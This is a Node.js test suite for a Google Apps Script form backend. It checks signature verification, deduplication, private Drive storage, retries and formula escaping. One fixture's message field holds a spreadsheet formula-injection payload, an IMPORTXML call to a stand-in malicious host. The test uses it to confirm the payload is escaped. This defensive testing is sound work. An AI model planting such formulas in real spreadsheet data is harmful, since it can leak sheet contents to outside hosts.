import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { createContext, runInContext } from "node:vm";
import { createHmac } from "node:crypto";
import { Buffer } from "node:buffer";

const source = readFileSync(new URL("../google-apps-script/Code.gs", import.meta.url), "utf8");
const secret = "a".repeat(64);
const id = "12345678-1234-4123-8123-123456789abc";
const otherId = "12345678-1234-4123-8123-123456789abd";

function fixture() {
  const state = { sheets: new Map(), files: new Map(), opens: 0, failWrite: false, failFlush: false, creates: 0,
    account: "oficial@llasantafe.com.ar", privateResources: [],
    properties: { API_SECRET: secret, SPREADSHEET_ID: "private-sheet", UPLOAD_FOLDER_ID: "private-folder" } };
  function sheet(headers) {
    const rows = headers ? [headers] : [], model = { rows, maxRows: 2,
      setName(name) {
        for (const [key, value] of state.sheets) if (value === model) state.sheets.delete(key);
        state.sheets.set(name, model);
      },
      setFrozenRows() {},
      getLastRow: () => rows.length, getMaxRows: () => model.maxRows,
      insertRowsAfter: (_, count) => { model.maxRows += count; },
      getRange(row, column, height = 1, width = 1) {
        return {
          getRow: () => row,
          getValues: () => Array.from({ length: height }, (_, i) =>
            Array.from({ length: width }, (_, j) => rows[row - 1 + i]?.[column - 1 + j] ?? "")),
          getValue: () => rows[row - 1]?.[column - 1] ?? "",
          setValues(values) {
            if (row > model.maxRows) throw new Error("grid limit");
            if (state.failWrite) { state.failWrite = false; throw new Error("write failure"); }
            values.forEach((valuesRow, i) => { rows[row - 1 + i] = [...valuesRow]; });
          },
          createTextFinder(value) {
            return { matchEntireCell() { return this; }, findNext() {
              for (let i = row - 1; i < row - 1 + height; i++) {
                if (rows[i]?.[column - 1] === value) return model.getRange(i + 1, column);
              }
              return null;
            } };
          },
        };
      },
    };
    return model;
  }
  const folder = {
    getId: () => "private-folder",
    setSharing(access, permission) {
      assert.equal(access, "PRIVATE"); assert.equal(permission, "NONE");
      state.privateResources.push("folder");
    },
    getFilesByName(name) {
      return { hasNext: () => state.files.has(name), next: () => state.files.get(name) };
    },
    createFile(blob) {
      state.creates++;
      const file = { getId: () => "private-file-id", getUrl: () => "https://drive.google.com/file/d/private-file-id/view",
        setSharing(access, permission) { assert.equal(access, "PRIVATE"); assert.equal(permission, "NONE"); } };
      state.files.set(blob.name, file);
      return file;
    },
  };
  const spreadsheet = {
    getId: () => "private-sheet", getUrl: () => "https://sheets.example/private-sheet",
    getSheets: () => [...state.sheets.values()], getSheetByName: name => state.sheets.get(name),
    setSpreadsheetTimeZone() {},
    insertSheet(name) { const model = sheet(); state.sheets.set(name, model); return model; },
  };
  const context = createContext({
    console: { log() {} }, Date, JSON,
    Session: { getEffectiveUser: () => ({ getEmail: () => state.account }) },
    PropertiesService: { getScriptProperties: () => ({
      getProperty: name => state.properties[name], setProperty: (name, value) => { state.properties[name] = value; },
    }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, tryLock: () => true, hasLock: () => true, releaseLock() {} }) },
    SpreadsheetApp: {
      create: () => { spreadsheet.insertSheet("Sheet1"); return spreadsheet; },
      openById: () => { state.opens++; return spreadsheet; },
      flush: () => { if (state.failFlush) { state.failFlush = false; throw new Error("ambiguous flush failure"); } },
    },
    DriveApp: {
      getFolderById: () => folder, createFolder: () => folder,
      getFileById: () => ({ setSharing(access, permission) {
        assert.equal(access, "PRIVATE"); assert.equal(permission, "NONE");
        state.privateResources.push("sheet");
      } }),
      Access: { PRIVATE: "PRIVATE" }, Permission: { NONE: "NONE" },
    },
    Utilities: {
      Charset: { UTF_8: "UTF-8" },
      computeHmacSha256Signature: (payload, key) => [...createHmac("sha256", key).update(payload).digest()],
      base64Decode: value => [...Buffer.from(value, "base64")],
      newBlob: (bytes, type, name) => ({ bytes, type, name }),
    },
    ContentService: { MimeType: { JSON: "JSON" }, createTextOutput: text => ({ text, setMimeType() { return this; } }) },
  });
  runInContext(source, context);
  const headers = JSON.parse(runInContext("JSON.stringify(HEADERS)", context));
  state.sheets.set("Sumate", sheet(headers.sumate));
  state.sheets.set("Propuestas", sheet(headers.propone));
  function send(submission, change = value => value) {
    const payload = JSON.stringify(submission), timestamp = String(Date.now());
    const signature = createHmac("sha256", secret).update(timestamp + "." + payload).digest("hex");
    return JSON.parse(context.doPost({ postData: { contents: JSON.stringify(change({ payload, timestamp, signature })) } }).text);
  }
  return { state, send, setup: () => context.setupWorkspace() };
}

test("setupWorkspace crea recursos restringidos y encabezados sin duplicarlos ni borrar filas", () => {
  const f = fixture();
  f.state.sheets.clear();
  delete f.state.properties.SPREADSHEET_ID;
  delete f.state.properties.UPLOAD_FOLDER_ID;
  f.setup();
  assert.deepEqual([...f.state.sheets.keys()], ["Sumate", "Propuestas"]);
  assert.equal(f.state.properties.SPREADSHEET_ID, "private-sheet");
  assert.equal(f.state.properties.UPLOAD_FOLDER_ID, "private-folder");
  assert.ok(f.state.privateResources.includes("sheet"));
  assert.ok(f.state.privateResources.includes("folder"));
  assert.equal(f.send(submission()).ok, true);
  f.setup();
  assert.equal(f.state.sheets.get("Sumate").rows.length, 2);
  assert.equal(f.state.sheets.size, 2);
});

test("setupWorkspace exige cuenta oficial, secreto y esquema compatible", () => {
  const f = fixture();
  f.state.account = "otra@example.com";
  assert.throws(f.setup, /oficial@llasantafe/);
  f.state.account = "oficial@llasantafe.com.ar";
  f.state.properties.API_SECRET = "short";
  assert.throws(f.setup, /API_SECRET/);
  f.state.properties.API_SECRET = secret;
  f.state.sheets.get("Sumate").rows[0][0] = "encabezado modificado";
  assert.throws(f.setup, /schema_mismatch/);
});

function submission(kind = "sumate") {
  return {
    schemaVersion: 1, requestId: id, kind, receivedAt: new Date().toISOString(), fingerprint: "b".repeat(64),
    data: kind === "sumate"
      ? { nombre: "Persona de prueba", dni: "01234567", whatsapp: "+54 9 341 1234567", localidad: "Rosario", quiereFiscalizar: false }
      : { nombre: "Persona de prueba", telefono: "+54 9 341 1234567", email: "prueba@example.com", profesion: "otro", motivo: "proyecto", mensaje: '=IMPORTXML("https://malicious.example","//a")' },
    attachment: kind === "sumate" ? null : { name: "prueba.pdf", mimeType: "application/pdf", size: 14, base64: Buffer.from("%PDF-1.7\n%%EOF").toString("base64") },
  };
}

test("Apps Script rechaza firma manipulada y fecha expirada antes de abrir Sheets", () => {
  const f = fixture();
  assert.equal(f.send(submission(), envelope => ({ ...envelope, signature: "c".repeat(64) })).ok, false);
  assert.equal(f.send(submission(), envelope => ({ ...envelope, timestamp: "1000000000000" })).ok, false);
  assert.equal(f.send(submission(), envelope => ({ ...envelope, payload: envelope.payload + " " })).ok, false);
  assert.equal(f.state.opens, 0);
});

test("Apps Script almacena DNI y teléfono como texto y fiscalización como booleano", () => {
  const f = fixture();
  assert.deepEqual(f.send(submission()), { ok: true, id });
  const row = f.state.sheets.get("Sumate").rows[1];
  assert.equal(row[6], "'01234567");
  assert.equal(row[7], "'+54 9 341 1234567");
  assert.equal(row[9], false);
});

test("Apps Script no duplica registros por ID ni por contenido", () => {
  const f = fixture(), value = submission();
  assert.equal(f.send(value).ok, true);
  assert.equal(f.send(value).ok, true);
  assert.deepEqual(f.send({ ...value, requestId: otherId }), { ok: true, id });
  assert.equal(f.send({ ...value, fingerprint: "c".repeat(64) }).ok, false);
  assert.equal(f.state.sheets.get("Sumate").rows.length, 2);
});

test("Apps Script guarda adjunto privado y escapa fórmulas", () => {
  const f = fixture();
  assert.deepEqual(f.send(submission("propone")), { ok: true, id });
  assert.equal(f.state.creates, 1);
  const row = f.state.sheets.get("Propuestas").rows[1];
  assert.ok(row[10].startsWith("'=IMPORTXML"));
  assert.equal(row[11], "private-file-id");
});

test("Apps Script recupera el archivo sin duplicarlo tras un fallo de Sheets", () => {
  const f = fixture(), value = submission("propone");
  f.state.failWrite = true;
  assert.equal(f.send(value).ok, false);
  assert.deepEqual(f.send(value), { ok: true, id });
  assert.equal(f.state.creates, 1);
  assert.equal(f.state.sheets.get("Propuestas").rows.length, 2);
});

test("Apps Script confirma un reintento si Google guardó antes de un timeout", () => {
  const f = fixture(), value = submission();
  f.state.failFlush = true;
  assert.equal(f.send(value).ok, false);
  assert.deepEqual(f.send(value), { ok: true, id });
  assert.equal(f.state.sheets.get("Sumate").rows.length, 2);
});

test("Apps Script amplía las filas al llegar al límite inicial de la hoja", () => {
  const f = fixture(), value = submission();
  assert.equal(f.send(value).ok, true);
  assert.equal(f.send({ ...value, requestId: otherId, fingerprint: "d".repeat(64) }).ok, true);
  assert.equal(f.state.sheets.get("Sumate").rows.length, 3);
});
